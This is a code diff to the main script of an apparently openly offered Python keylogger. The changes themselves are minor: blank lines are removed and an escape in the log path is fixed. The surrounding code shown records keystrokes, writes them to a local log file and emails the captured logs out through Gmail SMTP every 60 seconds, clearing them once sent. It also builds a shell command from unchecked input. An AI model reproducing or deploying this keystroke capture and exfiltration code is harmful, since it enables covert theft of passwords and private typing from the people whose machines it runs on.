@@ -9,12 +9,10 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__
 
 from src.keylogger import Keylogger
 
-
 def get_env_var(var):
     command = subprocess.Popen(f"echo {var}", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE, shell=True)
     return ((command.stdout.read()).decode("utf-8").splitlines()[0]).replace("\\", "/")
-
 
 def save_text_locally(text, file_path):
     try:
@@ -32,7 +30,6 @@ def save_text_locally(text, file_path):
 
     return True
 
-
 def send_gmail(text, email, password):
     email_content = "Subject: {}\n\n{}".format(f"New Keylogger Logs", text)
 
@@ -45,7 +42,6 @@ def send_gmail(text, email, password):
         return True
     except smtplib.SMTPResponseException:
         return False
-
 
 class Main:
     def __init__(self, timer, export_path="", gmail="", gmail_pass=""):
@@ -75,6 +71,5 @@ class Main:
                     if send_gmail(key_log, self.gmail, self.gmail_pass):
                         self.keylogger.clear_key_log()
 
-
 if __name__ == "__main__":
-    Main(60, "%userprofile%\log.txt").start()
+    Main(60, "%userprofile%\\log.txt").start()
